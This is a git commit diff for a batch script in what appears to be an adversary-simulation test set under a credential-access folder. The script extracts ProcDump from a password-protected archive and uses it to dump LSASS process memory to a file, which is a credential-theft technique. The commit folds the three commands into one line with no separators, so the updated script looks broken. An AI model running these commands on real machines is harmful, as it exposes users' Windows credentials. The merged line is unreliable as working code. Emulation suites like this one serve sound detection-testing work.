4202bc33dad982e03fba7e5d0f2156948b8fe641
NaimishP <36006376+NaimishP@users.noreply.github.com>
2020-03-25 15:03:00 -0500

    Update lsass-dump.bat
    Single line command update

--- test-sets/credential-access/lsass-dump.bat
+++ test-sets/credential-access/lsass-dump.bat
@@ -3,8 +3,4 @@
 ECHO ===========================================================================
 ECHO LSASS DUMP
 ECHO Dumping LSASS memory with ProcDump
-ping -n 5 127.0.0.1 > NUL
-
-"%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%PUBLIC%" toolset\procdump64.exe > NUL
-
-"%PUBLIC%\procdump64.exe" -accepteula -ma lsass.exe "%APTDIR%\somethingwindows.dmp" 2>&1
+ping -n 5 127.0.0.1 > NUL "%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%PUBLIC%" toolset\procdump64.exe > NUL "%PUBLIC%\procdump64.exe" -accepteula -ma lsass.exe "%APTDIR%\somethingwindows.dmp" 2>&1
